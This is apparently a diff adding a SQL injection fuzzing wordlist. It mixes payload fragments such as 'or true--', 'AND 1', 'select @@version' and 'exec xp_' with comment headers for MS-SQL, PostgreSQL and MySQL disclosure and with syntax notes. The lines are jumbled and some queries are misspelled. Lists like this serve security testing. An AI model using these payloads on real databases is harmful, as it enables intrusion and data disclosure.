@@ -1,0 +1,42 @@
+1
+select * from sysusers
+-2
+@variable	local variable
+# from wapiti
+# ms-sqli info disclosure payload fuzzfile
+-- -	SQL comment
+AND 0
+# info disclosure payload fuzzfile for pgsql
+select @@version
+or true--
+Time-Based:
+1-false
++		addition, concatenate (or space in url)
+//
+# fuzz interesting absolute filepath/filename into <filepath>
+select * from master..sysserverse
+1*56
+%		wildcard attribute indicator
+# contains statements from jbrofuzz
+/*  	C-style comment
+AND 1
+,
+# you will need to customize/modify some of the values in the queries for best effect
+AND true
+select @@servernamee
+#	    Hash comment
+# Numeric
+-- or # 
+``
+Comments:
+@@variable	global variable
+`
+[1]
+`	    Backtick
+Finding the table name
+AND false
+/*…*/ 
+/
+# mysql local file disclosure through sqli
+1 exec sp_ (or exec xp_)
+select @@microsoftversione
